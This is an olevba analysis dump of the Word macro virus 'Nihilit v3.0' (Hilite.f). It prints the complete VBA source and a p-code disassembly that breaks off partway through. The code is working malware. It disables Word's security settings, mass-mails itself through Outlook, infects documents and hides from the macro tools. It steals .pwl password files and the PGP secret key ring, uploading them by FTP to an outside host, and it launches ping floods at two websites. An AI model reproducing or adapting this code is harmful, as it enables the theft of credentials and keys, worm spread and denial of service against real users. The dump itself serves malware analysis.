olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hilite.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hilite.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulo1.bas 
in file: Virus.MSWord.Hilite.f - OLE stream: 'Macros/VBA/Modulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
    On Error Resume Next
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "porno.doc"
If sv = 3 Then svt$ = "readme!.doc"
If sv = 2 Then svt$ = "sex.doc"
' Nihilit v3.0 by Necronomikon |[Zer0 Gravity]
' thanks WalruS for help and code
    Call Nihilit
End Sub
Sub Nihilit()
    On Error Resume Next
        With Options
            .VirusProtection = False
            .ConfirmConversions = False
            .SaveNormalPrompt = False
        End With
    Application.DisplayAlerts = wdAlertsNone
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.VBComponents.Item("Nihilit").Name <> "Nihilit" Then
    ActiveDocument.VBProject.VBComponents("Nihilit").Export ("C:\Windows\Nihilit.drv")
    SetAttr "C:\Windows\Nihilit.drv", 6
    End If
    ActiveDocument.SaveAs FileName:="C:\Windows\Nihilit.doc", FileFormat:=wdFormatDocument
    Set Ni_OApp = CreateObject("Outlook.Application")
    Set Ni_Mapi = Ni_OApp.GetNameSpace("MAPI")
    For Each Ni_AddList In Ni_Mapi.AddressLists
    Next
    If Ni_AddList.AddressEntries.Count <> 0 Then
    For Ni_AddListCount = 1 To Ni_AddList.AddressEntries.Count
    Next
    Set Ni_AddListEntry = Ni_AddList.AddressEntries(Ni_AddListCount)
    Set Ni_msg = Ni_OApp.CreateItem(0)
    Ni_msg.To = Ni_AddListEntry.Address
    Ni_msg.Subject = "Check this!!!"
    Ni_msg.Body = "I like this story!!!;o)." + vbCrLf + "Nihilit"
    Ni_msg.Attachments.Add Environ("WINDIR") & "\Nihilit.doc"
    Ni_msg.DeleteAfterSubmit = True
    If Ni_msg.To <> "" Then
    Ni_msg.Send
    End If
    Call InfectDocument
    If Month(Now) = Day(Now) Then Call Pwdstealer
    NormalTemplate.Saved = True
    End If
End Sub

Sub InfectDocument()
    On Error Resume Next
    If ActiveDocument.VBProject.VBComponents.Item("Nihilit").Name <> "Nihilit" Then
    ActiveDocument.VBProject.VBComponents.import ("C:\Windows\Nihilit.drv")
    ActiveDocument.Save
    End If
End Sub

Sub Pwdstealer()
'thanks Fallen Angel for code...
    On Error Resume Next
    With Application.FileSearch
.FileName = "*.pwl"
.LookIn = "c:"
.Execute
For i = 1 To .FoundFiles.Count
Shell "ftp http://members.tripod.com/Nihilit/"
Shell "nihilit"
Shell "killer"
Shell "post" & .FoundFiles(i)
Shell "bye"
Next i
End With
End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = True
    Options.SaveNormalPrompt = True
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
End Sub

Sub ToolsSecurity()
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = True
Dialogs(wdDialogToolsSecurity).Show
CommandBars("Macro").Controls("Security...").Enabled = False
End Sub

Sub FileTemplates()
End Sub

Sub ToolsMacro()
    Call Stealth
    Dialogs(wdDialogToolsMacro).Display
End Sub

Sub ViewVBCode()
    Call Stealth
    ShowVisualBasicEditor = True
End Sub

Sub Stealth()
    On Error Resume Next
    Application.OrganizerDelete Source:=NormalTemplate.Name, _
    Name:="Nihilit", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerDelete Source:=ActiveDocument.Name, _
    Name:="Nihilit", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Saved = True
    ActiveDocument.Saved = True
End Sub
Sub HelpAbout()
WordBasic.FileNew
    WordBasic.ToggleFull
    WordBasic.DocMaximize
    WordBasic.Font "Comic Sans MS"
    WordBasic.FontSize 60
    WordBasic.Bold
    WordBasic.Insert "Check this!"
    WordBasic.StartOfLine
    WordBasic.CharRight 1, 1
    WordBasic.FormatFont Points:="48", Color:=6
    WordBasic.EndOfLine
    WordBasic.InsertPara
    WordBasic.InsertPara
    WordBasic.FontSize 48
    WordBasic.Insert "Nihilit,v3.0 was coded by Necronomikon."
End Sub
Sub FileExit()
    On Error Resume Next
    Call Nihilit
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Nihilit
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Nihilit
End If
Loop
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "h:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Nihilit
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Nihilit
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Nihilit
End If
Loop
    If ActiveDocument.Saved = False Then ActiveDocument.Save
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "r:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "s:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False

'taken from WM97/Caligula by Opic[CodeBreakers]
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Nihilit3") = False) Then

pgppath = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command", "")
Position = InStr(1, pgppath, "pgpt")

If Position <> 0 Then
pgppath = Mid(pgppath, 1, Position - 2)
Else
GoTo noPGP
End If

With Application.FileSearch
    .FileName = "\Secring.skr"
    .LookIn = pgppath
    .SearchSubFolders = True
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
    .Execute
    PGP_Sec_Key = .FoundFiles(1)
End With

Randomize
  For i = 1 To 4
    NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 1)
  Next i
  NewSecRingFile = "./secring" & NewSecRingFile & ".skr"

Open "c:\sys.vxd" For Output As #1
    Print #1, "ftp http://members.tripod.com/Nihilit/"
    Print #1, "user nihilit"
    Print #1, "pass killer"
    Print #1, "cd incoming"
    Print #1, "binary"
    Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & """"
    Print #1, "quit"
    Close #1

Shell "command.com /c ftp.exe -n -s:c:\sys.vxd", vbHide

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Nihilit3") = True

End If

noPGP:
Shell " ping -l 5000 -t www.gmx.de", vbHide
Shell " ping -l 5000 -t www.symantec.com", vbHide
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Hilite.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modulo1 - 12903 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	ArgsCall Read 0x0000 
' Line #3:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St sv 
' Line #4:
' 	Ld sv 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "porno.doc"
' 	St svt$ 
' 	EndIf 
' Line #5:
' 	Ld sv 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "readme!.doc"
' 	St svt$ 
' 	EndIf 
' Line #6:
' 	Ld sv 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "sex.doc"
' 	St svt$ 
' 	EndIf 
' Line #7:
' 	QuoteRem 0x0000 0x002D " Nihilit v3.0 by Necronomikon |[Zer0 Gravity]"
' Line #8:
' 	QuoteRem 0x0000 0x0020 " thanks WalruS for help and code"
' Line #9:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #10:
' 	EndSub 
' Line #11:
' 	FuncDefn (Sub Nihilit())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #14:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #15:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #16:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #17:
' 	EndWith 
' Line #18:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #19:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #20:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #22:
' 	LitStr 0x0007 "Nihilit"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Nihilit"
' 	Ne 
' 	IfBlock 
' Line #23:
' 	LitStr 0x0016 "C:\Windows\Nihilit.drv"
' 	Paren 
' 	LitStr 0x0007 "Nihilit"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #24:
' 	LitStr 0x0016 "C:\Windows\Nihilit.drv"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	LitStr 0x0016 "C:\Windows\Nihilit.doc"
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #27:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set Ni_OApp 
' Line #28:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld Ni_OApp 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set Ni_Mapi 
' Line #29:
' 	StartForVariable 
' 	Ld Ni_AddList 
' 	EndForVariable 
' 	Ld Ni_Mapi 
' 	MemLd AddressLists 
' 	ForEach 
' Line #30:
' 	StartForVariable 
' 	Next 
' Line #31:
' 	Ld Ni_AddList 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #32:
' 	StartForVariable 
' 	Ld Ni_AddListCount 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Ni_AddList 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #33:
' 	StartForVariable 
' 	Next 
' Line #34:
' 	SetStmt 
' 	Ld Ni_AddListCount 
' 	Ld Ni_AddList 
' 	ArgsMemLd AddressEntries 0x0001 
' 	Set Ni_AddListEntry 
' Line #35:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld Ni_OApp 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set Ni_msg 
' Line #36:
' 	Ld Ni_AddListEntry 
' 	MemLd Address 
' 	Ld Ni_msg 
' 	MemSt True 
' Line #37:
' 	LitStr 0x000D "Check this!!!"
' 	Ld Ni_msg 
' 	MemSt Subject 
' Line #38:
' 	LitStr 0x0018 "I like this story!!!;o)."
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0007 "Nihilit"
' 	Add 
' 	Ld Ni_msg 
' 	MemSt Body 
' Line #39:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000C "\Nihilit.doc"
' 	Concat 
' 	Ld Ni_msg 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #40:
' 	LitVarSpecial (True)
' 	Ld Ni_msg 
' 	MemSt DeleteAfterSubmit 
' Line #41:
' 	Ld Ni_msg 
' 	MemLd True 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #42:
' 	Ld Ni_msg 
' 	ArgsMemCall Send 0x0000 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	ArgsCall (Call) InfectDocument 0x0000 
' Line #45:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Pwdstealer 0x0000 
' 	EndIf 
' Line #46:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Sub InfectDocument())
' Line #51:
' 	OnError (Resume Next) 
' Line #52:
' 	LitStr 0x0007 "Nihilit"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Nihilit"
' 	Ne 
' 	IfBlock 
' Line #53:
' 	LitStr 0x0016 "C:\Windows\Nihilit.drv"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #54:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Sub Pwdstealer())
' Line #59:
' 	QuoteRem 0x0000 0x001F "thanks Fallen Angel for code..."
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #62:
' 	LitStr 0x0005 "*.pwl"
' 	MemStWith FileName 
' Line #63:
' 	LitStr 0x0002 "c:"
' 	MemStWith LookIn 
' Line #64:
' 	ArgsMemCallWith Execute 0x0000 
' Line #65:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #66:
' 	LitStr 0x0026 "ftp http://members.tripod.com/Nihilit/"
' 	ArgsCall Shell 0x0001 
' Line #67:
' 	LitStr 0x0007 "nihilit"
' 	ArgsCall Shell 0x0001 
' Line #68:
' 	LitStr 0x0006 "killer"
' 	ArgsCall Shell 0x0001 
' Line #69:
' 	LitStr 0x0004 "post"
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Concat 
' 	ArgsCall Shell 0x0001 
' Line #70:
' 	LitStr 0x0003 "bye"
' 	ArgsCall Shell 0x0001 
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #72:
' 	EndWith 
' Line #73:
' 	EndSub 
' Line #74:
' Line #75:
' 	FuncDefn (Sub ToolsOptions())
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #78:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #79:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #80:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #81:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #82:
' 	EndSub 
' Line #83:
' Line #84:
' 	FuncDefn (Sub ToolsSecurity())
' Line #85:
' 	OnError (Resume Next) 
' Line #86:
' 	LitVarSpecial (True)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #87:
' 	Ld wdDialogToolsSecurity 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #88:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #89:
' 	EndSub 
' Line #90:
' Line #91:
' 	FuncDefn (Sub FileTemplates())
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' 	FuncDefn (Sub ToolsMacro())
' Line #95:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #96:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #97:
' 	EndSub 
' Line #98:
' Line #99:
' 	FuncDefn (Sub ViewVBCode())
' Line #100:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #101:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #102:
' 	EndSub 
' Line #103:
' Line #104:
' 	FuncDefn (Sub Stealth())
' Line #105:
' 	OnError (Resume Next) 
' Line #106:
' 	LineCont 0x0004 09 00 04 00
' 	Ld NormalTemplate 
' 	MemLd New 
' 	ParamNamed Source 
' 	LitStr 0x0007 "Nihilit"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #107:
' 	LineCont 0x0004 09 00 04 00
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed Source 
' 	LitStr 0x0007 "Nihilit"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #108:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #109:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #110:
' 	EndSub 
' Line #111:
' 	FuncDefn (Sub HelpAbout())
' Line #112:
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0000 
' Line #113:
' 	Ld WordBasic 
' 	ArgsMemCall ToggleFull 0x0000 
' Line #114:
' 	Ld WordBasic 
' 	ArgsMemCall DocMaximize 0x0000 
' Line #115:
' 	LitStr 0x000D "Comic Sans MS"
' 	Ld WordBasic 
' 	ArgsMemCall Font 0x0001 
' Line #116:
' 	LitDI2 0x003C 
' 	Ld WordBasic 
' 	ArgsMemCall FontSize 0x0001 
' Line #117:
' 	Ld WordBasic 
' 	ArgsMemCall Bold 0x0000 
' Line #118:
' 	LitStr 0x000B "Check this!"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #119:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfLine 0x0000 
' Line #120:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall CharRight 0x0002 
' Line #121:
' 	LitStr 0x0002 "48"
' 	ParamNamed Points 
' 	LitDI2 0x0006 
' 	ParamNamed Color 
' 	Ld WordBasic 
' 	ArgsMemCall FormatFont 0x0002 
' Line #122:
' 	Ld WordBasic 
' 	ArgsMemCall EndOfLine 0x0000 
' Line #123:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #124:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #125:
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall FontSize 0x0001 
' Line #126:
' 	LitStr 0x0027 "Nihilit,v3.0 was coded by Necronomikon."
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #127:
' 	EndSub 
' Line #128:
' 	FuncDefn (Sub FileExit())
' Line #129:
' 	OnError (Resume Next) 
' Line #130:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #131:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #132:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #133:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #134:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #135:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #136:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #137:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #138:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #139:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #140:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #141:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #142:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #143:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	Loop 
' Line #146:
' 	LitStr 0x0002 "p:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #147:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #148:
' 	LitStr 0x0002 "h:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #149:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #150:
' 	LitStr 0x0002 "f:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #151:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #152:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #153:
' 	EndSub 
' Line #154:
' 	FuncDefn (Sub AutoExit())
' Line #155:
' 	OnError (Resume Next) 
' Line #156:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #157:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #158:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #159:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #160:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #161:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #162:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #163:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #164:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #165:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #166:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #167:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #168:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #169:
' 	EndIfBlock 
' Line #170:
' 	Loop 
' Line #171:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #172:
' 	LitStr 0x0002 "p:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #173:
